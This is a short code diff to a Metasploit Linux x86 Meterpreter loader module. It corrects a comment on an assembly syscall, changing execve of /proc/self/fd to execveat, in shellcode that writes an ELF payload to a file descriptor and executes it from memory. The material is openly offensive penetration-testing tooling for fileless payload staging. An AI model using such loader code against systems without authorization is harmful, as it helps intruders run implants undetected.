@@ -22,7 +22,6 @@ module Msf::Payload::Linux::X86::MeterpreterLoader
         mov esi, eax
         mov eax, 0x4
         int 0x80                            ; write(fd, elfbuffer, elfbuffer_len);
-        
         xor edx, edx
         xor esi, esi
         push edx
@@ -30,7 +29,7 @@ module Msf::Payload::Linux::X86::MeterpreterLoader
         push 0x1000
         pop edi
         mov eax, 0x166
-        int 0x080                           ; execve("/proc/self/fd/<fd>", NULL, NULL);
+        int 0x080                           ; execveat(fd,NULL, NULL, NULL);
       get_payload:
         call got_payload
     ^
